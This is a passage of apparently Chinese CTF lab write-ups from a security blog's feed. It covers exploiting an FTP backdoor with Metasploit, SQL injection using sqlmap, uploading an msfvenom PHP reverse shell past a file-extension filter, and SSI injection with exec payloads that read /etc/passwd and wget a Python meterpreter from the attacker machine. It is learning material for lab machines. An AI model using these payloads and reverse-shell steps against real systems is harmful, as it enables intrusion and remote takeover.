loading="lazy"><br>没成功，但是还有一个密码，就是sqlmap爆出的密码<code>SuperSecretPassword</code><br><img src="https://img-blog.csdnimg.cn/202008010054073.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>提权成功。<br>已经root权限了，找什么不就是轻而易举的了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————FTP服务后门利用及SQL注入</title>
      <link href="/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8F%8ASQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E5%8F%8ASQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>前言：CTF靶场系列的，这篇是好几次学习总结的。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：<code>192.168.40.132</code><br>靶机：<code>192.168.40.150</code><br>目的当然还是获取靶机的flag</p><h2 id="直接跳过重复步骤"><a href="#直接跳过重复步骤" class="headerlink" title="直接跳过重复步骤"></a>直接跳过重复步骤</h2><p><img src="https://img-blog.csdnimg.cn/20200729131348559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>开放端口和版本信息知道了，开始搜索相应版本的服务是否存在已知漏洞<br><img src="https://img-blog.csdnimg.cn/20200729131604365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>有后门存在的漏洞，先查看一下详细信息。kali中集成部分漏洞库还是比较全的，还方便查看。还可以找网站查询。我习惯用kali了。就没有留网站，现在也找不到了。</p><p><img src="https://img-blog.csdnimg.cn/20200729143405664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个源代码需要修改进行利用，比如这个IP地址，需要修改为靶机的IP，对于新手还是有些难度的。<br><img src="https://img-blog.csdnimg.cn/20200729144705844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以使用第二个，在metasploit中集成的模块进行利用。<br><img src="https://img-blog.csdnimg.cn/20200729161157222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>后门利用，选择这个<br>查看并选择一个payload<br><img src="https://img-blog.csdnimg.cn/20200729162424477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>设置好后，继续设置其他的参数，<br>然后开始攻击exploit<br><img src="https://img-blog.csdnimg.cn/20200729163144336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到了root权限<br>优化shell终端也行，不优化也可以。<br>优化代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>奇怪的是，没有flag了，可能被删了。不纠结这个。<br><img src="https://img-blog.csdnimg.cn/20200729164928924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个是利用FTP服务的后门，来进行攻击，使用metasploit集成的模块进行利用。</p><p>上面是这段时间学习的服务漏洞的一个总结。下面的是常见漏洞</p><h1 id="SQL注入get参数"><a href="#SQL注入get参数" class="headerlink" title="SQL注入get参数"></a>SQL注入get参数</h1><p>SQL注入的产生原因通常表现在以下几个方面：<br>①不当的类型处理<br>②不安全的数据库配置<br>③不合理的查询集处理<br>④不当的错误处理<br>⑤转义字符处理不合适<br>⑥多个提交处理不当</p><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：<code>192.168.40.132</code><br>靶场机器：<code>192.168.40.151</code></p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机服务信息以及服务版本<br><img src="https://img-blog.csdnimg.cn/20200729195118318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>更多信息进行探测<br><img src="https://img-blog.csdnimg.cn/202007291954387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>开启了http服务，可以尝试使用工具进行目录扫描查看敏感信息等操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nikto -host http://192.168.40.151</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.40.151</span><br><span class="line">+ Target Hostname:    192.168.40.151</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-29 19:56:42 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.16 (Debian)</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.3.3-7+squeeze14</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Uncommon header <span class="string">&#x27;tcn&#x27;</span> found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, <span class="built_in">which</span> allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives <span class="keyword">for</span> <span class="string">&#x27;index&#x27;</span> were found: index.php</span><br><span class="line">+ Apache/2.2.16 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ OSVDB-630: The web server may reveal its internal or real IP <span class="keyword">in</span> the Location header via a request to /images over HTTP/1.0. The value is <span class="string">&quot;127.0.0.1&quot;</span>.</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag</span><br><span class="line">+ OSVDB-5034: /admin/login.php?action=insert&amp;username=<span class="built_in">test</span>&amp;password=<span class="built_in">test</span>: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to <span class="built_in">log</span> <span class="keyword">in</span> with user <span class="string">&#x27;test&#x27;</span> password <span class="string">&#x27;test&#x27;</span> to verify.</span><br><span class="line">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: /css/: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: /css/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: /images/: Directory indexing found.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /icons/README, inode: 3524, size: 5108, mtime: Tue Aug 28 18:48:10 2007</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /admin/login.php: Admin login page/section found.</span><br><span class="line">+ 8727 requests: 0 error(s) and 22 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-29 19:57:09 (GMT8) (27 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><p>可以查看到很多敏感信息，比如这里的PHP版本是5.3<br>还有一个web页面是<code>/admin/login.php</code>进行访问查看，进行深入挖掘<br><img src="https://img-blog.csdnimg.cn/20200729195926985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>后台登录界面<br>先尝试弱口令，admin等常见弱口令进行尝试，但是没有成功。</p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>web漏洞扫描器<code>owasp-zap</code><br>是世界上最受欢迎的免费安全工具之一。zap可以帮助我们在开发和测试应用程序的过程中，自动发现web应用中的安全漏洞。另外，他也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。<br><img src="https://img-blog.csdnimg.cn/20200729203806934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>选好后直接进行攻击<br>攻击完成后会自动跳转到这个界面，可以看到有SQL注入，和反射xss等漏洞。颜色不同，漏洞的危险等级也不同。<br><img src="https://img-blog.csdnimg.cn/20200729203958605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里只进行查看SQL注入的漏洞。使用sqlmap进行探测。<br><img src="https://img-blog.csdnimg.cn/20200729212247268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用sqlmap进行注入就是快很多，账号密码也得到了，可以进行登录了。<br><img src="https://img-blog.csdnimg.cn/20200729212444179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="上传shell反弹权限"><a href="#上传shell反弹权限" class="headerlink" title="上传shell反弹权限"></a>上传shell反弹权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.40.132 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p>然后保存生成的shell到桌面<br>启动监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.40.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020072922041881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>正在监听<br>上传shell执行shell<br><img src="https://img-blog.csdnimg.cn/20200729221200723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>发现描述——不是PHP</p><ul><li>绕过过滤机制们利用<code>.php</code>修改为<code>.PHP</code><br><img src="https://img-blog.csdnimg.cn/20200729221605466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>成功了，查看侦听端口<br><img src="https://img-blog.csdnimg.cn/20200729221821265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>完全没问题。<br>使用shell，可以控制终端命令行<br>然后尝试去到root目录找flag<br><img src="https://img-blog.csdnimg.cn/20200729222125140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>发现权限不够，需要提权。<br>不过这个只是进行SQL注入。提权再另说。<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li></ul><ol><li>靶场机器如果存在SQL注入漏洞，可以利用sqlmap进行获取数据；</li><li>获得靶场机器shell后，可以分析是否需要提权。如果在当前权限下可以得到flag，那么就不需要提权；</li><li>SQL注入往往要和上传漏洞配合，上传shell。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF————Web安全SSI注入</title>
      <link href="/2020/08/23/CTF%E2%80%94%E2%80%94Web%E5%AE%89%E5%85%A8SSI%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/23/CTF%E2%80%94%E2%80%94Web%E5%AE%89%E5%85%A8SSI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>本文首发<a href="https://www.freebuf.com/">FreeBuf.COM</a><br>原本地址——🍗<a href="https://www.freebuf.com/articles/network/245231.html">CTF——Web安全SSI注入</a></p><p>前言：如何从外部进入主机</p><h1 id="SSI注入攻击介绍"><a href="#SSI注入攻击介绍" class="headerlink" title="SSI注入攻击介绍"></a>SSI注入攻击介绍</h1><h2 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h2><p>SSI(server side inject)的出现是为了赋予HTML静态页面动态的效果，通过SSI来执行系统命令；并返回对应的结果。</p><p>如果再网站目录中发现了<code>.stm；.shtm；.shtml；</code>这样的文件后缀名，并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很有可能被SSI注入攻击。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>①显示服务器端环境变量<code>&lt;#echo&gt;</code></p><p>本文档名称：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!–#echo</span> <span class="attr">var</span>=<span class="string">&quot;DOCUMENT_NAME&quot;</span>–&gt;</span></span><br></pre></td></tr></table></figure><p>现在时间：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!–#echo</span> <span class="attr">var</span>=<span class="string">&quot;DATE_LOCAL&quot;</span>–&gt;</span></span><br></pre></td></tr></table></figure><p>显示IP地址：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!</span> #<span class="attr">echo</span> <span class="attr">var</span>=<span class="string">&quot;REMOTE_ADDR&quot;</span>–&gt;</span></span><br></pre></td></tr></table></figure><p>②将文本内容直接插入到文档中<code>&lt;#include&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!</span> #<span class="attr">include</span> <span class="attr">file</span>=<span class="string">&quot;文件名称&quot;</span>–&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--#include virtual=&quot;index.html&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!</span> #<span class="attr">include</span> <span class="attr">virtual</span>=<span class="string">&quot;文件名称&quot;</span>–&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p><p>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</p><p>文件最近更新日期：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!</span> #<span class="attr">flastmod</span> <span class="attr">file</span>=<span class="string">&quot;文件名称&quot;</span>–&gt;</span></span><br></pre></td></tr></table></figure><p>文件的长度：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!–#fsize</span> <span class="attr">file</span>=<span class="string">&quot;文件名称&quot;</span>–&gt;</span></span><br></pre></td></tr></table></figure><p>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!–#exec</span> <span class="attr">cmd</span>=<span class="string">&quot;文件名称&quot;</span>–&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!–#exec</span> <span class="attr">cgi</span>=<span class="string">&quot;文件名称&quot;</span>–&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;</span></span><br></pre></td></tr></table></figure><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击机：kali <code>10.0.2.4</code></p><p>靶场机器：linux<code>10.0.2.15</code></p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机服务信息以及服务版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV [ip]</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020080117460350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>可以看出靶场机器开放了80端口并且操作系统是ubuntu</p><p>快速扫描主机全部信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v [ip]</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020080117462391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>既然是开启的http服务，那么就应该是可以访问的，思路就是可以在浏览器直接访问查看有没有可以利用的信息，并且扫描结果显示robots协议中发现一个信息。有时候还会在源代码中藏有信息。<br><img src="https://img-blog.csdnimg.cn/20200801174704296.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>这个在默认界面没有发现信息，但是robots中发现了目录<code> /spukcab</code><br><img src="https://img-blog.csdnimg.cn/20200801174719735.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>挨个查看，看看有无敏感信息。可以下载下来，more查看内容，发现一个可能有用的信息，根据前几次的经验，这里可能是个用户名<code>webmaster</code>；只是可能。还有就是站点根目录的位置已经得到了。<br><img src="https://img-blog.csdnimg.cn/20200801174735787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>其他的暂时没有，继续探测，因为是http服务，所以可以使用nikto或者dirb进行敏感目录扫描</p><h2 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h2><p>分析nmap、nikto扫描结果，并对结果进行分析，挖掘可利用的信息；<br><img src="https://img-blog.csdnimg.cn/20200801174758402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>都进行浏览查看敏感信息，寻找可利用的位置；</p><p>挨个访问查看信息，<code>http://10.0.2.15/index</code><br><img src="https://img-blog.csdnimg.cn/20200801175131376.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>上面扫描中有个SSI<br><img src="https://img-blog.csdnimg.cn/20200801174817312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还有这里，发现<code>.shtml</code>文件<br><img src="https://img-blog.csdnimg.cn/20200801174906852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>猜想可能存在SSI注入，其实找了很多信息，就是为了找到这个能证明有SSI存在的标志。</p><p>继续找可以利用的信息，发现<code>http://10.0.2.15/index.php</code><br><img src="https://img-blog.csdnimg.cn/20200801175109305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以在这个表单提交处，这里执行SSI的命令</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据提示来利用对应的SSI注入</p><p>将上面index页面中的payload复制一下，粘贴到表单中进行提交</p><p>像这样<br><img src="https://img-blog.csdnimg.cn/20200801175317199.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>提交后发现第一行过滤了尖括号，第二行的exec被过滤了。而且payload也不是完整的。<br><img src="https://img-blog.csdnimg.cn/20200801175328391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>绕过这个exec的过滤条件，因为是linux系统，所以首先想到的应该是大小写。而且完整的payload应当在前面有<code>!</code><br>像这样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot; --&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200801175408808.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>比如：</p><p>列举当前目录中的文件和目录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;ls&quot;--&gt;</span></span><br></pre></td></tr></table></figure><p>就是可以执行一些终端命令</p><p>进一步利用，下载一个shell脚本并重命名为shell.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;wget http://ip/shell.txt | rename shell.txt shell.php&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h2><p>之前使用的php制作的webshell，这次使用python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp lhost=10.0.2.4 lport=4444 -f raw &gt; /root/Desktop/shell.py</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020080117543731.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>启动监听，使用metasploit对4444端口进行监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; python/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.0.2.4</span><br><span class="line">lhost =&gt; 10.0.2.4</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.2.4:4444 </span><br></pre></td></tr></table></figure><p>设置好后开始侦听4444端口<br><img src="https://img-blog.csdnimg.cn/20200801175504902.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>将shell.py移动到apache目录下，才可以使用IP地址的链接下载<br><img src="https://img-blog.csdnimg.cn/20200801175517993.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>然后需要开启apache服务<code>service apache2 start</code><br><img src="https://img-blog.csdnimg.cn/2020080117553599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>然后执行下载命令将shell下载到靶机的站点目录当中，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;wget http://10.0.2.4/shell.py&quot;--&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200801175551640.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>然后执行语句赋予shell执行权限再进行执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#加权限</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;chmod 777 shell.py&quot;--&gt;</span></span><br><span class="line">#执行</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;python shell.py&quot;--&gt;</span></span><br></pre></td></tr></table></figure><p>然后看到浏览器在不断发送请求，到终端查看监听状况，发现返回了<code>meterpreter</code><br><img 